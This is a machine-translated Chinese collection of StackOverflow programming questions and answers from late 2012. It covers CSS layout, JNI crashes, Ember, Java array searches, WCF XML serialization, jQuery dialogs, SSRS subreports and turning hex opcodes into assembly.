# StackOverflow 问答 14074000-14074999

# css - 让元素以 100% 宽度的 div 居中放置在我的页面上

> ID：14074002
> 
> 赞同：0
> 
> 时间：2012-12-28T18:25:42.497
> 
> 标签：css

我一直使用全局包装器来保持我的布局 960px 并将我的所有内容包含在包装器内。我正试图摆脱这一点，而是让我所有的“部门”（如刊头、导航、滑块、content_area）看起来像这样：

```
 // CSS:
 .container {
            width: 960px;
            margin: 0 auto;
        }

        #masthead {
            width: 100%;
            background: #000;
        }

        #navigation {
            width: 100%;
            background: red;
        }

        #slider {
            width: 100%;
            background: grey;
        }

 // HTML:
 <div id="masthead">
        <div class="container">
            <!-- masthead content goes here -->
        </div>
 </div>
 <div id="navigation">
        <div class="container">
            <!-- navigation content goes here -->
        </div>
 </div>
 <div id="slider">
        <div class="container">
            <!-- masthead content goes here -->
        </div>
 </div> 
```

首先，我不相信这是实现最终结果的唯一方法（或者可能是最好的方法）。尽管这很有效，并且我能够更好地设置我的各个部门的样式，并且仍然限制内容的宽度和“位置”，但我真的很重视如何在没有过多容器类的情况下实现上述目标。

我的第二个问题，更具体地说，我寻求建议的原因在于我现在正在使用的项目中，我没有用于上面滑块的“容器”。我希望我的幻灯片是全屏的（所以实际上幻灯片是从屏幕的边缘）到页面的中心位置。我仍然希望我的幻灯片宽度为 960 像素或不超过该宽度，但是当滑入以定位在“滑块”div 的中心时。

我正在使用的插件叫做 LayerSlider，它允许我在每张幻灯片上都有“层”，可以从不同的方向滑入到幻灯片的最终位置。（此处示例：[LayerSlider 全屏预览](http://codecanyon.net/item/layerslider-the-parallax-effect-slider/full_screen_preview/922100)）。

每个幻灯片元素都是绝对定位的，您必须使用“left”和“top”指示幻灯片层将在动画之后定位的位置。

我已经设法使用“left: 50%; top: 5%”使内容“居中”，但是当我调整浏览器的大小时，元素会移动到不合适的位置。

我希望我是有道理的，希望有人可以帮助我如何在全宽 div 中定位元素，并且无论用户分辨率如何，它看起来仍然相同。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:25:20.440

只要您不想在包装器上设置背景，就不需要一个来包含您的内容并使其居中。您可以通过将该样式直接应用于`body`：

## HTML

```
<nav>
  hi i am the navigation
</nav>
<footer>
  hi i am the footer
</footer>​ 
```

## CSS

```
html {
  width: 100%;
}
body {
  border: 1px solid #ddd;
  width: 50px;
  margin: 0 auto;
}​ 
```

[**在 JSFiddle 上查看**](http://jsfiddle.net/dJbds/1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-21T15:54:16.683

找不到任何其他解决方案，坚持我所知道的:)

# java - g++ 编译后的核心转储 + 与 jni 的链接以及随后使用 C++ 和 Java 执行应用程序

> ID：14074006
> 
> 赞同：1
> 
> 时间：2012-12-28T18:25:57.833
> 
> 标签：java, c++, linker, java-native-interface, invocation

我需要从 C++ 中执行一些任意 Java 代码。我正在为此使用 JNI，但遇到了一个问题。C++ 文件编译得很好，但是在执行时会产生以下内容：

> Java 运行时环境检测到一个致命错误：
> 
> SIGSEGV (0xb) 在 pc=0xb6f90ffb，pid=10063，tid=3062122240
> 
> JRE 版本：7.0_10-b18 Java VM：Java HotSpot(TM) 服务器 VM (23.6-b04 混合模式 linux-x86) 有问题的框架：V [libjvm.so+0x440ffb] JNI_ArgumentPusherVaArg::JNI_ArgumentPusherVaArg(_jmethodID*, char*)+ 0x1b
> 
> 核心转储写入。默认位置：/home/alex/candjava/core 或 core.10063
> 
> 包含更多信息的错误报告文件保存为：/home/alex/candjava/hs_err_pid10063.log
> 
> 如果您想提交错误报告，请访问： [http ://bugreport.sun.com/bugreport/crash.jsp](http://bugreport.sun.com/bugreport/crash.jsp)
> 
> 中止（核心转储）

编译命令：

`g++ sample.cpp -o app -I $JAVA_HOME/include -I $JAVA_HOME/include/linux -I $JAVA_HOME/jre/lib/i386/client -L$JAVA_HOME/jre/lib/i386/client -ljvm -Wno-write-strings`

`$JAVA_HOME`在哪里`/usr/lib/jvm/java-7-oracle`

java源码：

```
public class Main{

public void test(){
    System.out.println("HELLO WORLD");
    }
} 
```

C++ 源代码：

```
#include <stdio.h>
#include <stdlib.h>
#include <jni.h>
#include <string.h>

int main()
{
    JavaVM *jvm;       /* denotes a Java VM */
    JNIEnv *env;       /* pointer to native method interface */
    JavaVMInitArgs vm_args; /* JDK/JRE 6 VM initialization arguments */
    JavaVMOption* options = new JavaVMOption[1];
    options[0].optionString = "-D java.class.path=/usr/lib/jvm/java-7-oracle/bin";
    vm_args.version = JNI_VERSION_1_6;
    vm_args.nOptions = 1;
    vm_args.options = options;
    vm_args.ignoreUnrecognized = false;
    /* load and initialize a Java VM, return a JNI interface
     * pointer in env */
    JNI_CreateJavaVM(&jvm, (void**)&env, &vm_args);
    delete options;
    /* invoke the Main.test method using the JNI */
    jclass cls = env->FindClass("Main");
    jmethodID mid = env->GetStaticMethodID(cls, "test", "(I)V");
    env->CallStaticVoidMethod(cls, mid, 100);
    /* We are done. */
    jvm->DestroyJavaVM();

} 
```

对此的任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T18:28:12.067

您没有检查 JNI 函数返回的任何错误。您需要检查错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-30T14:56:14.230

```
jmethodID mid = env->GetStaticMethodID(cls, "test", "(I)V"); 
```

说你的函数是无效的，你有整数作为参数。但是您没有发送任何整数参数，它必须如下

```
jmethodID mid = env->GetStaticMethodID(cls, "test", "()V"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-05-01T02:20:57.480

您的源代码中有一些明显的错误。

1.  Main 类中的测试方法应该是静态的
2.  测试参数应该是 int
3.  java.class.path 参数很荒谬

我也有第三个问题。更改选项`-Djava.class.path=/Path-to-your-class-file-directory`就可以了。（我的是`"-Djava.class.path=."`）

# javascript - 带有“a”标签的 Ember View 助手的意外行为

> ID：14074007
> 
> 赞同：3
> 
> 时间：2012-12-28T18:26:01.240
> 
> 标签：javascript, ember.js, handlebars.js

```
{{#view tagName="a" href="#"}}
  The Link
{{/view}} 
```

**预期的 HTML**

```
<a href="#" class="ember-view" id="emberXXX"> The Link </a> 
```

**现实**

```
<a class="ember-view" id="emberXXX"> The Link </a> 
```

看不到`href`属性

也试过`hrefBinding="#", href=true`

在类似的行中，我想将一个动作与之关联，所以尝试了以下失败尝试

```
{{#view tagName="a" href="#" snippet}}
  The Link
{{/view}} 
```

片段在哪里`action="showHome", click="showHome", actionBinding="showHome", clickBinding="showHome"`（此处的操作用于路由转换）

他们都没有工作，我知道我可以简单地做到

```
<a href="#" {{action showHome}}>The Link</a> 
```

**或**定义视图

```
aView = Ember.View.extend({
  tagName: 'a',
  click: function(){
    this.get('controller').controllers.send('showHome');
  }
}) 
```

让事情正常进行，但我很好奇如何以**模板**方式实现它

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-28T19:59:30.903

简而言之（和解决方法）

```
{{#view Ember.Button tagName="a" target="#" action="someAction"}}Link Name{{/view}} 
```

长篇回答：

当你说你可以简单地做

```
<a href="#" {{action showHome}}>The Link</a> 
```

那是您获得`href="#"`某些预定义路由操作的唯一方法。但从 JavaScript 应用程序的角度来看，创建/扩展视图更有意义。

当您说您也尝试过时`hrefBinding="#"`，这意味着您了解绑定是针对**该**视图的。**因此，从模板**的角度来看，`html`不应该只支持（我认为）在标签中包含虚拟链接。正确的方法应该是扩展视图：

 **```
AnchorView = Ember.View.extend({
  tagName: 'a',
  attributeBindings: ['href'],
  href: '#' //
}); 
```**

# java - Java Arrays - 搜索数组中的元素，然后找到索引

> ID：14074012
> 
> 赞同：0
> 
> 时间：2012-12-28T18:26:33.307
> 
> 标签：java, arrays

我正在尝试编写一个程序来搜索一个城市，给定一个邮政编码。程序必须在数组 postalcode 中搜索该邮政编码并返回城市名称。我到目前为止的代码是：

.

```
import javax.swing.JOptionPane;

public class Postalcode 
{

    public static void main(String[] args) 
    {
        int[] postalcode = {9300,2000,1000,9200,9000,8500,9700,2300};
        String[] city = {"Aalst","Antwerpen","Brussel","Dendermonde","Gent","Kortrijk","Oudenaarde","Turnhout"};

        int code = Integer.parseInt(JOptionPane.showInputDialog("Give a postal code")); 
    }
} 
```

我遇到的问题是我不知道如何将被询问的代码链接到数组中的城市。例如，用户键入代码 2000，所以这是邮政编码 [1]，我想要的城市是安特卫普，因为城市 [1]。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-28T18:34:56.277

我会认真考虑为此使用 HashMap 而不是 2 个数组。

```
HashMap<int,String> cities =  new HashMap<int,String>();
cities.put(9000,"Gent");
cities.put(9400,"Aalst"); 
String city = cities.get(9400);
System.out.println(city); 
```

为了进一步适应您的任务：

```
 int code = Integer.parseInt(JOptionPane.showInputDialog("Give a postal code"));
 string city = cities.get(code); 
```

编辑：数组的解决方案：

我必须说这是一种非常奇怪的方法，但如果你真的想用数组来做：

我假设城市数组的长度与邮政编码数组的长度相同。

```
 int index = 0;
   int pCode = 9300;

for (int i = 0; i < postalcode.length; i ++)
{                       
  if (pCode == postalcode[i])
     {
        index = i;
        break;
     }

 }   

System.out.println(cities[index]) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-28T18:36:54.297

```
int code = Integer.parseInt(JOptionPane.showInputDialog("Give a postal code"));

int requiredIndex = -1;
for (int i = 0; i < postalcode.length; i++)
    if (postalcode[i] == code)
        requiredIndex = i;
if (requiredIndex == -1){
    //there is no such postal code
} else {
    //your city is
    System.out.println(city[requiredIndex]);
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-28T20:15:56.120

实际上，接受的答案将花费每个查询的线性时间。虽然 a仍然是一个更好的选择（具有恒定的摊销时间），但如果您重新排列数组以便对其进行排序，则`HashMap`可以比使用数组的线性时间做得更好。`postalCode`这允许您执行`O(log(n))`二进制搜索。

**例子：**

```
final int[] orderedPostCode = { 1000, 2000, 2300, 8500, 9000, 9200, 9300, 9700 };
final String[] orderedCities = { "Brussel", "Antwerpen", "Turnhout", "Kortrijk", "Gent", "Dendermonde", "Aalst", "Oudenaarde" };

final int code = Integer.parseInt(JOptionPane.showInputDialog("Give a postal code"));

final int codePos = Arrays.binarySearch(orderedPostCode, code);
if (codePos < 0) {
    JOptionPane.showMessageDialog(null, "Postal code not found", "Error", JOptionPane.ERROR_MESSAGE);
}
else {
    JOptionPane.showMessageDialog(null, "City: " + orderedCities[codePos]);
} 
```

* * *

这导致了一个有趣的后续问题：如何以快速二进制搜索所需的方式对任意一组邮政编码和城市进行排序：

```
int[] postalCode = {9300,2000,1000,9200,9000,8500,9700,2300};
String[] city = {"Aalst","Antwerpen","Brussel","Dendermonde","Gent","Kortrijk","Oudenaarde","Turnhout"};

int[] orderedPostCode = Arrays.copyOf(postalCode, postalCode.length);
Arrays.sort(orderedPostCode);
String[] orderedCities = rearrangeCities(city, postalCode, orderedPostCode);
System.out.println(Arrays.toString(orderedPostCode));
System.out.println(Arrays.toString(orderedCities));
// Will print the arrays of the first example 
```

这是`rearrangeCities`实现`O(n²)`：

```
private static String[] rearrangeCities(String[] cities, int[] postalCode, int[] orderedPostCode) {
    final String[] orderedCities = new String[cities.length];
    for (int newPos = 0; newPos < orderedPostCode.length; newPos++) {
        final int curPostalCode = orderedPostCode[newPos];
        for (int oldPos = 0; oldPos < postalCode.length; oldPos++) {
            if (postalCode[oldPos] == curPostalCode) {
                orderedCities[newPos] = cities[oldPos];
                break;
            }
        }
    }
    return orderedCities;
} 
```

由于您的目标是提高您对 Java 数组的了解，我相信这些都是很好的示例。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-28T18:37:58.657

当您在第一个数组中搜索时，保存成功的索引并获取另一个数组的该元素。

```
 if(postalCode[i]==input)
        index=i; 
```

现在你想要`city[index]`

`index`应该在搜索循环之外声明，以便在搜索之后可以访问 in（除非您以后不需要访问）

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-12-28T18:38:36.763

由于您想提高数组的技能，我想这会有所帮助。没有什么复杂或高效的，但这已经足够了。

```
 int[] postalcode = {9300,2000,1000,9200,9000,8500,9700,2300};
     String[] city = {"Aalst","Antwerpen","Brussel","Dendermonde","Gent","Kortrijk","Oudenaarde","Turnhout"};

     int code = Integer.parseInt(JOptionPane.showInputDialog("Give a postal code")); 

     for(int i = 0; i< postalcode.length;i++){
         if(postalcode[i] == code){
          System.out.println(city[i]); 
              //or do something with the value here
         }
     } 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-12-28T18:41:14.143

使用两个数组*确实*不是这样做的方法，但看起来你所拥有的是与`city`相应代码相同索引的城市`postalcode`

您需要进行线性搜索，`postalcode`然后拉出城市：

```
String foundCity = null;
for (int i = 0; i < postalcode.length; i++)
{
    if (postalcode[i] == code)
    {
        foundCity = city[i]; 
        break;   
    }
} 
```

如果`foundCity`不为空，则您找到了 zip 并拥有城市。

# wcf - WCF序列化集合属性时如何删除集合的根元素

> ID：14074017
> 
> 赞同：0
> 
> 时间：2012-12-28T18:27:02.033
> 
> 标签：wcf, xml-serialization

我在序列化 XML 元素时遇到问题，特别是删除数组/集合的根标记

```
 public Class Part
    {
        public Guid Id { get; set; }
        [System.Xml.Serialization.XmlElementAttribute(IsNullable = false)]
        [DataMember(IsRequired = true)]
        public string PartNumber { get; set; }

        [System.Xml.Serialization.XmlElementAttribute(IsNullable = false)]
        [DataMember(IsRequired = true)]
        public string PartName { get; set; }

        [System.Xml.Serialization.XmlElementAttribute(IsNullable = true)]
        public string Description { get; set; }

        [System.Xml.Serialization.XmlElementAttribute(IsNullable = false)]
        public DateTime LastUpdated { get; set; }

        [XmlElement()]
        public string[] PartDetails{ get; set; }
    } 
```

wcf 将其序列化为

```
 <b:Part>
            <b:PartDetail xmlns:c="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
              <c:string>ABC</c:string>
            </b:PartDetail>
            <b:PartDetail xmlns:c="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
              <c:string>DEF</c:string>
            </b:PartDetail>
            <b:Description> JGHGS SGHSGH SJGHSJG</b:Description>
            <b:Id>740ead2d-84e8-4da0-9115-28dea5f0bd28</b:Id>
            <b:LastUpdated>2012-11-30</b:LastUpdated>
            <b:PartName>AAA BBB CCC DDDD</b:PartName>
            <b:PartNumber>1</b:PartNumber>
          </b:Part> 
```

我需要什么

```
 <b:Part>
                <b:PartDetail xmlns:c="http://schemas.microsoft.com/2003/10/Serialization/Arrays">ABC</b:PartDetail>
                <b:PartDetail xmlns:c="http://schemas.microsoft.com/2003/10/Serialization/Arrays">DEF</b:PartDetail>             

                <b:Description> JGHGS SGHSGH SJGHSJG</b:Description>
                <b:Id>740ead2d-84e8-4da0-9115-28dea5f0bd28</b:Id>
                <b:LastUpdated>2012-11-30</b:LastUpdated>
                <b:PartName>AAA BBB CCC DDDD</b:PartName>
                <b:PartNumber>1</b:PartNumber>
              </b:Part> 
```

我在 SO 中发现了类似的问题，但没有得到任何明确的答案（可能不明白）如何将它与 WCF 一起使用。

基本上我想要

```
<ArrayPropertyName>ABC</ArrayPropertyName>
<ArrayPropertyName>DEF</ArrayPropertyName>
<ArrayPropertyName>GHI</ArrayPropertyName> 
```

代替

```
<ArrayPropertyName>
<string> ABC</string>
<string> DEF</string>
<string> GHI</string>
</ArrayPropertyName> 
```

是否可以在 wcf 发送 xml 序列化数据之前搜索和删除标签？

让我知道问题是否清楚。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:45:30.330

您需要创建一个 PartDetail 类来完成此操作，例如

```
public class PartDetail
{
    [XmlText()] 
    public string value;
}    

public Class Part
{

     [XmlElement("PartDetail")]
     public PartDetail[] PartDetails { get; set; }

} 
```

# jquery - 如何使用 jQuery 更改选择框的选定选项？

> ID：14074018
> 
> 赞同：0
> 
> 时间：2012-12-28T18:27:02.530
> 
> 标签：jquery, jquery-ui

> **可能重复：**
> [如何选择一个选项并设置它？](https://stackoverflow.com/questions/3895400/how-do-i-select-an-option-select-and-set-it)

我有一个如下定义的选择框。

```
<select @string.Format("id={0}", Model.FieldId) name="Id1" onclick="LoadIds('@string.Format("{0}", Model.FieldId)')">
    <option @string.Format("value={0}", row.ID1) selected="selected">@row.ID1</option>
</select> 
```

选择框的所有选项都在 onclick 事件中加载。当我启动页面时，它会在选择框中显示适当的值（如所选），并且选项也可以从“LoadIds”函数中正常加载。现在我想从下拉列表中选择一个不同的值并将新值设置为选中。我想我需要实现 onchange 事件。我的问题是如何从旧选项中删除选定的属性并将其添加到新的选定选项中？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T18:29:57.540

在选择上使用 jQuery`.val('valueHere')`将使下拉列表中的活动项变为传递的值（如果可用）。

```
<select id="a">
        <option val="1">One</option>
        <option selected="selected" val="2">Two</option>
        <option val="3">Three</option>
</select> 
```

jQuery

```
$('#a').val('1');​ 
```

该`selected`属性仍将出现在两个上，但不会被选中。您不需要删除该属性，它只是用于默认选择。如果你真想看看`.prop()`。

使用`.removeProp()`on的警告，`selected`如评论和 jQuery 文档中所述

> **注意**：请勿使用此方法删除本机属性，例如选中、禁用或选中。这将完全删除该属性，并且一旦删除，就不能再次将其添加到元素中。使用 .prop() 将这些属性设置为 false。

# xcode - Xcode 不再显示 64 位构建选项

> ID：14074021
> 
> 赞同：1
> 
> 时间：2012-12-28T18:27:13.993
> 
> 标签：xcode, macos, build, settings

我正在尝试构建一个链接到 Unity3D 的静态库的包。在寻找实现这一点的方法时，我以某种方式将我的项目设置为仅构建 32 位。我需要能够将其设置为 32 位或 64 位。

我已经尝试了确保架构设置为正常（32/64 位）或 64 位 Intel 的明显步骤。无论我做了什么更改，我收到的唯一构建选项是“我的 Mac 32 位”。

我正在使用 Xcode 4.5

# reporting-services - 如何在 SQL Server Reporting Services 中创建子报表

> ID：14074025
> 
> 赞同：0
> 
> 时间：2012-12-28T18:27:37.140
> 
> 标签：reporting-services, ssrs-2008

我在 Reporting Services 2008 R2 中开发了一个采用 3 个参数的报告：

*   开始日期
*   结束日期
*   UserId（从下拉列表中选择）

并从 4 个不同的数据集中生成一些数据。

我接下来要做的是允许多个 UserId 选择并生成每个用户一页的报告。我认为我可以通过使用列表并将所有其他表放入列表中来做到这一点，但它不允许我这样做，因为它说列表必须仅从 1 个数据集中提取数据。

我怎样才能做到这一点？还是我必须做一个新的报告并从那里调用这个报告？我该怎么做？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T18:37:22.627

你在正确的道路上。但是，请不要理会您的初始（单用户）报告。`Users`相反，使用列表中显示的数据集创建一个新的“主”报告。在该列表中添加一个显示单个用户信息[的子报表。](http://msdn.microsoft.com/en-us/library/dd239314.aspx)该子报表可以传递参数并具有多个数据集。

# c - 将十六进制操作码解码为 asm 或在 __asm 中运行十六进制？

> ID：14074040
> 
> 赞同：1
> 
> 时间：2012-12-28T18:28:54.700
> 
> 标签：c, visual-c++, assembly

Visual Studio 2010（或 Windows 上的其他工具）中是否有任何方法可以采用十六进制操作码指令，例如

`EB D2`

和“解码”或以其他方式将它们翻译成人类可读的汇编？

或者，有没有办法直接在一个`__asm`块中运行十六进制指令？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-28T18:33:53.517

调试器反汇编窗口在这方面做得很好。

Visual Studio 有一个。WinDbg 有一个（或`u`在命令行中用于“反汇编”）。其他调试器，如 OllyDbg 或 IDA Pro 可能符合要求。

或者你可以寻找一个独立的*反汇编*程序。

就此而言，您可以找到交互式在线反汇编程序。

[http://www.onlinedisassembler.com/odaweb/run_hex](http://www.onlinedisassembler.com/odaweb/run_hex)说 EB D2 是一个跳转指令。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-28T18:38:22.977

因为您提到了 Visual Studio，所以我假设您正在寻找内部工具，或者您正在使用 MASM。NASM 有自己的反汇编器，但它的语法与 MASM 的不同。

我知道有一个老把戏，至少在几年前就已经奏效了。您可以将字符串转换为 C 中的函数，如下所示：

```
/*
 * Illustration of executing machine code as a C string.  Works on an
 * IA-32 processor.
 */

#include <stdio.h>

int (*f)() = "\xb0\x64\x0f\xb6\xc0\xc3";

int main() {
    printf("%d\n", f());
    return 0;
} 
```

这里函数`f`将值 100 移动到`eax`寄存器中并返回它（`C3`是返回的操作码）。不确定这是否适用于 Visual Studio 的 C 方言，如果您使用的是 64 位处理器，则可能需要更新它。它确实提供了一个有趣的替代`__asm`块。

**附录**

该程序在运行 Mountain Lion 的 MacBook Pro 上仍然可以正常运行：

```
$ cat hundred.c 
#include <stdio.h>

int (*f)() = "\xb0\x64\x0f\xb6\xc0\xc3";

int main() {
    printf("%d\n", f());
    return 0;
}

$ gcc hundred.c && ./a.out 
hundred.c:3: warning: initialization from incompatible pointer type
100 
```

正如在下面的评论中所指出的，如果字符串位于操作系统不允许执行的段中，这种解决方案将不起作用。

# android - 像 youtube 一样的墙壁轮播

> ID：14074042
> 
> 赞同：1
> 
> 时间：2012-12-28T18:29:07.030
> 
> 标签：android, renderscript

我必须创建一个 3d 墙旋转木马，就像你管不同的行数（1,2 或 3）。我使用[这个](http://code.google.com/p/android-ui-utils/downloads/detail?name=CarouselExample.zip&can=1&q=)例子得到了它并修改了一些变量。

```
I have to change the cardVertices(given below) in Carousel.rs to change the size of    the cards in the carouselview. I am not sure how to do it dynamically.

static const float3 cardVertices[4] = {
   { 0.0, -1.0, -1.0},
    { 0.0, -1.0, 1.0 },
   { 0.0, 1.0, 1.0 },
    {0.0, 1.0, -1.0 }
}; 
```

现在我想根据同一项目中的行数重新调整卡片的大小。如果该行是 1，那么我希望卡尺寸大，如果是 2，那么将卡尺寸设置得更小。我可以在单独的项目中实现这一点，但我希望在同一个项目中获得结果（我无法上传图像以显示结果应该是什么样子）。

请帮助我，因为这是使用渲染脚本实现的，而我对渲染脚本知之甚少。任何帮助表示赞赏。

# php - 从 PHP 连接到 uPush 服务器。GET/POST/SOAP 混淆

> ID：14074047
> 
> 赞同：1
> 
> 时间：2012-12-28T18:29:20.837
> 
> 标签：php, post, soap, curl

我将尝试尽可能简单地描述这一点。uPush 是一种向 Andoid 手机发送推送通知的服务。手机端的软件我有功能。然而，连接到 uPush 服务器以实际发送推送消息让我很烦恼。我已经联系了他们的支持，并被告知直到今年第一年之后才有人可以帮助我。谷歌搜索他们的服务也几乎没有结果，所以我想我会在这里问。

他们的服务文档可以在[这里](http://www.upush.co.uk/docs.aspx)找到。特别是一种称为“uPush Web 服务”的服务。根据该文档，我应该能够使用“HTTP GET/POST 或 SOAP”将推送消息发送到他们的服务器[http://www.upush.co.uk/sendpush.asmx](http://www.upush.co.uk/sendpush.asmx)并带有几个强制输入，但它没有给出任何其他细节。我尝试过使用 PHP 和 cURL 的 POST 方法，但我只收到 SOAP 错误。我曾短暂地尝试过使用 SOAP，但遗憾的是它超出了我的想象，而且对于此类数据来说似乎过于复杂。

我怀疑有人对这项服务有任何经验，但如果有人至少能指出我正确的方向，我将不胜感激。

# jquery - 提交表单后在 JQ UI 小部件中显示成功，以及来自 UI.Dialog 的重定向

> ID：14074057
> 
> 赞同：1
> 
> 时间：2012-12-28T18:30:09.693
> 
> 标签：jquery, ajax, jquery-ui, coldfusion, dialog

感谢您甚至看一看。

我正在从数据库中删除一条记录。用户通过 Ajax 表单提交在 JQ UI.Dialog 中确认删除，然后基本上被重定向到同一页面以重新加载更新的数据。

这一切都很好，花花公子：

```
<script type="text/javascript">
$(function() {

    $( "#delete-invoice" ).click(function(event){
            event.preventDefault()
            $( "#confirmDelModal" ).dialog( "open" );
     });

    $( "#confirmDelModal" ).dialog({
        autoOpen: false,
        height: 220,
        width: 680,
        modal: true,
        buttons: {
            "Delete Invoice": function() {
              var options = {   
                    success: function(){
                        $("#confirmDelModal").dialog("close");
                        window.location.href="same-page.cfm";

                    }
                }; 
                $('#confirmDelete').ajaxSubmit(options);

                return false; 
            },
            Cancel: function() {
                $( this ).dialog( "close" );
            }
        },
        close: function() {
            $( this ).dialog( "close" );
        }
    });

}); 
```

表单提交后，我想在页面顶部显示“删除成功”消息。 [此主题滚动页面上的突出显示/错误框位于右侧的一半](http://jqueryui.com/themeroller/)

基本上，我想在重定向/页面重新加载后显示一个隐藏的成功 DIV。

过去几周我一直在学习 Ajax，并取得了不错的进步，但我仍在努力思考更大的概念，所以我确信可能有更好的方法来做到这一点，我也完全开放听到，请记住，设计师希望成功时出现特定风格的信息。

```
<div class="ui-widget">
<div class="ui-state-highlight ui-corner-all" style="margin-top: 20px; padding: 0 .7em;">
    <p><span class="ui-icon ui-icon-info" style="float: left; margin-right: .3em;"></span>
    <strong>Hey!</strong> Deletion Successful</p>
</div> 
```

非常感谢您提前

PS。在 Coldfusion 工作

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:15:17.563

在某些时候，您必须将模式对话框中的返回值发送到父页面。这是我几年前写的一个例子。请注意，它使用基本的 javascript，没有 ajax，但它确实显示了一般的想法。

这是在父页面上：

```
<cfoutput>
<script language="JavaScript">
function ServiceOther() {
if (document.Serviceform.service_id.value == "OTHER" ) {

NewContact=window.showModalDialog("#K.QryHome#ComplexCare/Contacts/OutsideNewService.cfm?    callPage=Addf","NewService","Dialogwidth:600px; Dialogheight:420px; center:yes ");

if (NewContact == true) // return value from dialogue
window.location="#K.QryHome#ComplexCare/Contacts/OutsideServices.cfm?callPage=AddWithNew";

} // end if
}// end of function

</script>
</cfoutput> 
```

在您的情况下，您希望将 window.location 命令替换为显示您的消息的内容。

就我而言，模态对话框页面中有一个如下所示的表单：

```
<cfform name="SKNewContactform" Action="ProcessNewOutsideService.cfm" method="post" 
onsubmit="window.returnValue = true; window.close();"> 
```

ProcessNewOutsideService.cfm 包含以下内容：

```
<script language=javascript>
function CloseWindow() {
window.open('','_self','');
window.opener = top;
window.close();
} 
```

然后是一堆coldfusion代码，最后，这个

```
<body onload="window.returnValue = true;  CloseWindow();"> 
```

再一次，一般的想法是让您的模态对话框窗口在关闭时向父窗口发送一个值。然后父窗口可以使用该值执行某些操作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T19:20:52.937

**解决方案**

要回答您的问题，您需要向服务器表明您希望在重新加载页面时显示成功消息。这可以通过使用查询字符串之类的 URL 来完成。

我不建议这样做，因为您会做比必要的工作更多的工作，而您要做的就是显示一条消息。您已经通过 AJAX 删除记录，因此您可以仅从客户端执行此操作，而无需再次请求整个页面。

**（更好）解决方案**

当您打开第一个对话框以显示详细信息时，请跟踪 DOM 中的记录（页面记录，而不是数据库记录）。一种简单的方法是将其存储在图标单击事件的变量中：

```
$deleteTarget;
$('.delete_icon').click(function() {
    $deleteTarget = $(this).closest('.myRowClass');
}); 
```

现在，如果您的用户删除了该行并且您在服务器上异步删除，您可以在客户端执行相同的操作：

```
$deleteTarget.remove(); 
```

...然后显示您的成功信息：

```
$('#successMessage').show(); 
```

现在您可以删除重新加载页面的行并关闭对话框（在执行上述操作之后）。

我会说这是比重新加载页面更好/更快的选择，因为客户端机器不需要向服务器发出另一个完整请求（服务器的工作量更少），也不需要重新加载页面（工作量更少为客户）。

**后期编辑：**只是想在删除客户端记录之前添加它，您应该确保它实际上在服务器上被删除。当您提出删除记录的请求时，您应该等待服务器的响应。如果记录在服务器上成功删除，它应该向客户端返回响应。一旦您收到显示删除成功的响应，您就可以删除客户端上的记录。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-02T04:03:17.840

改变

```
window.location.href="same-page.cfm"; 
```

到：

```
window.location.href="same-page.cfm?deleted=1"; 
```

并且在 CF 中有：

```
<cfif structKeyExists(url,"deleted")>.. {Div here}..</cfif> 
```

再加上一点天赋：

```
$(document).ready(function(){
   setTimeout(function(){ $("div.mydiv").fadeOut("slow"); }, 2000);
 }); 
```

# html - 定义表格高度时不需要的垂直对齐

> ID：14074058
> 
> 赞同：0
> 
> 时间：2012-12-28T18:30:11.050
> 
> 标签：html, css, alignment

我正在使用 HTML 和 CSS 创建一个网站。我有一个 HTML 表格，我在其中定义了高度和宽度。我正在定义高度（450px），以便整个站点的每个页面的高度都相同。但是，当我定义一个高度时，该表中的所有内容都希望垂直居中。我找到了很多关于垂直对齐的信息（如何），但是尝试使用这些方法来撤消垂直对齐是行不通的。由于删除高度是解决我的问题的唯一方法，因此我正在寻找一种解决方案，该解决方案允许我指定我的高度但不能垂直对齐表格中的所有内容。如有必要，我会发布代码，但我认为这个问题可能不需要它。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-04T20:05:15.473

如果没有更多信息，如何将 td 全局定义为 vetical-align top？下面是一个页面，但您可以在所有页面用来共享效果的通用 css 文件中定义它。

```
<html>
 <style>
  td {
   vertical-align:top;
  }
 </style>
 <body>
   <table style="height:450px;" border=1>
    <tr><td>hey</td><td>ho</td><td>let's go</td></tr>
    <tr><td>hey</td><td>ho</td><td>let's go</td></tr>
    <tr><td>hey</td><td>ho</td><td>let's go</td></tr>
  </table>
 </body>
</html> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-04T21:00:37.687

如果代码中的表格用于布局目的（而不是用于标记表格*数据*），我建议将更现代的 CSS 布局方法与`min-height`主容器结合使用。例如，[负边距方法](http://www.alistapart.com/articles/negativemargins/)。

# visual-studio - Visual Studio 的配置

> ID：14074060
> 
> 赞同：1
> 
> 时间：2012-12-28T18:30:44.313
> 
> 标签：visual-studio, msbuild

MS Visual Studio 2012 默认有两个配置：调试和发布。我为 AutoCAD 和 BricsCAD 编写插件。这段代码是相同的，但使用了不同的库引用。

我需要添加新配置：**DebugForAutoCAD**和**DebugForBricsCAD**。每个都必须有自己的*引用*、*默认命名空间*、*程序集名称*、*输出路径*和*启动外部程序*选项。

